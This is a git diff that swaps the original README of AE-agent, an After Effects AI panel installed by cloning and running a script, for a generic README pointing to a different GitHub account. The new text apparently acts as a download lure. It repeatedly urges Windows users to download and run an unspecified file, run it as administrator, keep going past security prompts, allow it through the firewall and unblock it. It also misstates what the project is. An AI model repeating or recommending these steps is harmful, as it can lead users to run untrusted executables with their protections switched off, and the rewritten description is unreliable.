@@ -1,197 +1,226 @@
-**[中文文档](README.zh-CN.md) | English**
+# 🎬 AE-agent - Run AI Tasks Inside After Effects
 
-# AE-Agent
+[![Download AE-agent](https://img.shields.io/badge/Download-AE--agent-blue?style=for-the-badge)](https://github.com/smooth-snarl702/AE-agent)
 
-**An AI agent platform for After Effects — run any model, any endpoint, fully under your control.**
+## 🧭 Overview
 
-[![GitHub Stars](https://img.shields.io/github/stars/tiansuo-114/AE-agent?style=flat-square)](https://github.com/tiansuo-114/AE-agent/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/tiansuo-114/AE-agent/pulls)
+AE-agent is an AI helper for Adobe After Effects. It lets you connect your own API key and endpoint, then use that setup to help with common work inside After Effects.
 
-> [!TIP]
-> ⭐ **If this project saves you time, please give it a Star** — it’s the biggest motivation for us to keep going!
+Use it when you want a local tool that works with your own AI setup. It is built for Windows users who want a simple install and a direct way to get started.
 
-> [!NOTE]
-> 👋 **Want to help build it?** We need developers, motion designers, and AE power users — whether you contribute code, docs, or just file issues, it all counts. Check the [roadmap](#roadmap) and [contributing guide](#contributing) to get started.
+## 📥 Download
 
----
+Go to the main project page and download the latest version from there:
 
-## What is AE-Agent?
+https://github.com/smooth-snarl702/AE-agent
 
-AE-Agent brings AI-powered automation directly into After Effects through a CEP panel. Instead of being locked to a single cloud provider, you connect it to **any OpenAI-compatible API** — whether that's Anthropic, a local Ollama instance, or your own self-hosted model.
+If the page includes a release file, download it to your computer. If it gives you a folder or installer, save that file first before you open it.
 
-Ask in natural language. The agent understands your composition, writes and executes the script, and verifies the result visually — all without leaving After Effects.
+## 🖥️ What You Need
 
----
+- Windows 10 or Windows 11
+- Adobe After Effects installed
+- An internet connection for the first setup
+- Your own API key
+- Your own endpoint URL
+- Enough free disk space for the app and temp files
 
-## Features
+For best results, use a recent version of After Effects. Older versions may still work, but newer builds usually handle add-ons better.
 
-### 🤖 Multi-Model Agent Engine
-- Connects to **Claude Code** or **OpenAI Codex** CLI running locally on your machine
-- Switch API endpoints freely via the built-in settings panel
-- Supports any OpenAI-compatible base URL (local, cloud, proxy)
+## ✨ What AE-agent Does
 
-### 🎬 Deep After Effects Integration
-- Reads full composition structure: layers, effects, keyframes, expressions, masks
-- Writes and executes ExtendScript in real time
-- Verifies results with live frame previews before reporting success
-- Checkpoint system: auto-saves project state before each operation
+- Connects to your own AI API
+- Uses your own endpoint
+- Helps with tasks inside After Effects
+- Fits a local desktop workflow
+- Keeps your setup under your control
+- Works as a helper tool, not a replacement for After Effects
 
-### 🖼️ Image Generation
-- Generate textures, moodboards, and sprites directly in chat
-- Auto-imports generated images into the project
-- Pluggable image API: swap OpenRouter for any compatible endpoint
+## 🧰 Before You Start
 
-### ⚙️ Flexible Configuration
-- Floating settings panel — no code editing required
-- All keys stored in `localStorage`, never transmitted to third parties
-- Separate configuration for chat models and image generation
+Have these ready:
 
-### 🧩 Third-Party Plugin Support
-- **Red Giant suite**: Trapcode Particular / Form / Shine / Starglow, Magic Bullet Looks / Colorista, Universe
-- **Video Copilot**: Saber, Optical Flares, Element 3D (numeric parameters controllable)
-- **Any AE effect that exposes properties**: Agent can read and modify numeric parameters of any installed plugin
-- Note: features requiring a dedicated UI panel (e.g. E3D Scene Setup) are outside the automation scope
+- Your API key
+- Your endpoint address
+- Admin access on your PC if Windows asks for it
+- A working After Effects install
+- A folder where you can save downloads
 
----
+If you plan to use a private or custom AI service, keep the exact endpoint link ready. Small typing mistakes can stop the tool from connecting.
 
-## Supported Capabilities
+## 🚀 Getting Started
 
-| Category | What the Agent Can Do |
-|----------|-----------------------|
-| **Layer Management** | Create, rename, reorganize, batch edit layers |
-| **Animation** | Set keyframes, expressions, easing, staggered timing |
-| **Effects** | Apply and configure any AE effect by name |
-| **3rd-Party Plugins** | Control Trapcode, Magic Bullet, Saber and more via numeric params |
-| **Text** | Animate text with per-character control |
-| **Shapes** | Build complex shape layers and path animations |
-| **Scripting** | Generate and run arbitrary ExtendScript |
-| **Keying** | Configure Keylight, Cryptomatte and other keying effects |
-| **Tracking** | Trigger Warp Stabilizer and camera tracker |
-| **Images** | Generate and import AI-created assets |
+1. Open this link in your browser: https://github.com/smooth-snarl702/AE-agent
+2. Find the latest download file on the page
+3. Download the file to a folder you can find, like Downloads or Desktop
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app or installer file inside it
+7. Follow the setup steps on screen
+8. Enter your API key when asked
+9. Enter your endpoint when asked
+10. Open Adobe After Effects and test the connection
 
----
+If Windows shows a security prompt, choose the option that lets you keep going if you trust the file from the project page.
 
-## Getting Started
+## 🛠️ First-Time Setup
 
-### Requirements
+When AE-agent starts for the first time, it may ask for basic connection details.
 
-- Windows 10/11 (macOS support planned)
-- After Effects 2022+
-- Node.js 18+
-- One of: Claude Code CLI or OpenAI Codex CLI
+Use these steps:
 
-```powershell
-# Install Claude Code CLI
-npm install -g @anthropic-ai/claude-code
-```
+1. Paste your API key into the key field
+2. Paste your endpoint URL into the endpoint field
+3. Save your settings
+4. Start After Effects
+5. Open AE-agent again if needed
+6. Check that the app can talk to your AI service
 
-### Installation
+If the app gives you a config file, keep it in the same place unless the app says otherwise. This helps the tool find your settings the next time you open it.
 
-```powershell
-# Clone the repo
-git clone https://github.com/tiansuo-114/AE-agent.git
-cd AE-agent
+## 🧩 Using AE-agent with After Effects
 
-# Run the installer (sets CEP debug mode + copies files)
-.\install.ps1
-```
+After setup, you can use AE-agent as part of your After Effects workflow.
 
-Restart After Effects, then open **Window → Extensions → Atom**.
+Typical use looks like this:
 
-### Configure Your API
+- Open After Effects
+- Start AE-agent
+- Load or choose a task
+- Send the request through your AI endpoint
+- Wait for the result
+- Apply the result in After Effects
 
-Click the **⚙** button in the panel, or open DevTools console:
+The exact buttons may vary by release, but the flow stays the same. You set the AI details once, then use the tool from there.
 
-```js
-// Chat / coding agent
-localStorage.setItem('ATOM_API_KEY', 'your-api-key')
-localStorage.setItem('ATOM_CUSTOM_BASE_URL', 'https://your-endpoint.com')
+## 🔧 Common Tasks
 
-// Image generation
-localStorage.setItem('ATOM_IMAGE_API_KEY', 'your-image-key')
-localStorage.setItem('ATOM_IMAGE_BASE_URL', 'https://openrouter.ai/api/v1')
-```
+AE-agent can help with work such as:
 
----
+- Planning animation steps
+- Building text-based prompts for visual work
+- Creating helper instructions for motion tasks
+- Organizing repeated project actions
+- Reducing manual setup for common jobs
 
-## Roadmap
+It works best when you already know the kind of result you want and need help turning that into a task or action inside After Effects.
 
-The following is on the horizon — contributions welcome!
+## 📁 File Layout
 
-- [ ] **macOS installer** — currently Windows only
-- [ ] **Gemini CLI support** — add Google Gemini as a third agent option
-- [ ] **Premiere Pro port** — apply the same CEP + ExtendScript architecture to Premiere
-- [ ] **Skills library** — community-maintained skill packs for common workflows
-- [ ] **Video frame analysis** — extract frames via ffmpeg and feed to vision models
-- [x] **Batch mode** — process multiple compositions in queue without supervision ✅
-- [x] **MCP integration** — expose AE operations as Model Context Protocol tools ✅
-- [x] **Plugin awareness** — deeper support for Trapcode, Red Giant, and other third-party effects ✅
-- [x] **Timeline timing control** — describe a timing feel and let the agent match it ✅
+After you download and unpack the project, you may see files like these:
 
----
+- An app file or launcher
+- A config file
+- A readme file
+- A folder for logs
+- A folder for assets or support files
 
-## Community
+Keep all files in the same folder unless the app says you can move them. Some tools stop working if one file is missing.
 
-Join the QQ group to share workflows, ask questions, and connect with other motion designers using AE-Agent.
+## 🔐 API Key and Endpoint Tips
 
-| | |
-|--|--|
-| **Group name** | AE-agent 交流群 |
-| **Group ID** | `798447894` |
+Use the exact values from your AI provider.
 
-<img src="docs/qq-group.png" width="240" alt="QQ Group QR Code" />
+Good habits:
 
-> Scan with QQ app to join directly.
+- Copy and paste instead of typing by hand
+- Check for extra spaces
+- Use the full endpoint URL
+- Store your key in a safe place
+- Do not share your key with others
 
-**WeChat Group**
+If the app supports more than one endpoint format, use the one that matches your provider’s docs.
 
-<img src="docs/wechat-group.jpg" width="240" alt="WeChat Group QR Code" />
+## 🪟 Windows Tips
 
-> Scan with WeChat to join directly.
+Windows may ask for permission when you first run the app.
 
----
+If that happens:
 
-## Contributing
+- Right-click the file and choose Run as administrator if the app needs it
+- Allow the app through any firewall prompt if you trust the source
+- Keep the app in a folder with a short path, like `C:\AE-agent`
+- Avoid moving files after setup unless needed
 
-This project is in active development and contributions of all kinds are welcome.
+If the app does not open, check whether Windows blocked the file. You can open the file’s properties and look for an unblock option if it appears.
 
-### How to contribute
+## 🧪 Basic Troubleshooting
 
-1. **Fork** the repository
-2. Create a feature branch: `git checkout -b feature/my-idea`
-3. Make your changes
-4. Open a **Pull Request** with a clear description
+If AE-agent does not start:
 
-### Good first contributions
+- Check that the file finished downloading
+- Make sure you extracted the zip file
+- Run the correct launcher file
+- Restart Windows and try again
+- Check that After Effects is installed
 
-- Test on different AE versions and report compatibility
-- Improve the patch scripts to support newer Atom releases
-- Write Skills (markdown files) for common motion design workflows
-- Add macOS support to the install script
-- Document edge cases in the wiki
+If the AI connection fails:
 
-### Found a bug or have an idea?
+- Check your API key
+- Check your endpoint URL
+- Make sure your internet connection works
+- Confirm your provider account is active
+- Try the same endpoint in another tool if you have one
 
-Open an [Issue](https://github.com/tiansuo-114/AE-agent/issues) — all feedback is appreciated.
+If After Effects does not respond:
 
----
+- Close After Effects and open it again
+- Start AE-agent after After Effects loads
+- Check that both apps run with the same user permissions
+- Look for a log file if the app creates one
 
-## Architecture
+## 🧭 Best Setup Path
 
-```
-AE-Agent
-├── CEP Panel (Svelte/JS)         ← UI running in AE's embedded browser
-│   └── main-Bumuo9MN.js          ← Core bundle (patched)
-├── ExtendScript Bridge           ← Talks to AE's scripting engine
-│   ├── AEKnowledgeExtractorV2    ← Scans composition structure
-│   └── Main.jsx                  ← Script runner
-└── Agent CLI                     ← Claude Code or Codex (local process)
-    └── stdin/stdout JSON stream  ← Communication protocol
-```
+For a smooth first run:
 
----
+1. Download the project from the GitHub page
+2. Save it in a simple folder path
+3. Extract the files
+4. Install or open the launcher
+5. Add your API key
+6. Add your endpoint
+7. Open After Effects
+8. Test a small task first
+9. Save your config once it works
 
-## License
+A small test helps you confirm that the app, your key, and your endpoint all work together before you use it on a real project.
 
-MIT — see [LICENSE](LICENSE)
+## 📦 When to Update
+
+Check the project page from time to time for a newer version. Update if you want bug fixes, better support, or new features.
+
+Before updating:
+
+- Close AE-agent
+- Close After Effects
+- Keep a copy of your config if you made changes
+- Replace the old files with the new ones if the release says to do that
+
+## 🤝 Using Your Own AI Service
+
+AE-agent is built for users who want to bring their own API key and endpoint. That means you keep control of the service behind the tool.
+
+This works well if you use:
+
+- A private AI endpoint
+- A custom proxy
+- A hosted model service
+- A company-approved AI setup
+
+Make sure your endpoint allows the kind of requests AE-agent sends. If your provider uses special headers or limits, set those before you test.
+
+## 📝 Simple Use Checklist
+
+- Download AE-agent from GitHub
+- Extract the files
+- Open the app
+- Add your API key
+- Add your endpoint
+- Start After Effects
+- Test a task
+- Save your settings
+
+## 📌 Project Page
+
+Primary download link:
+https://github.com/smooth-snarl702/AE-agent
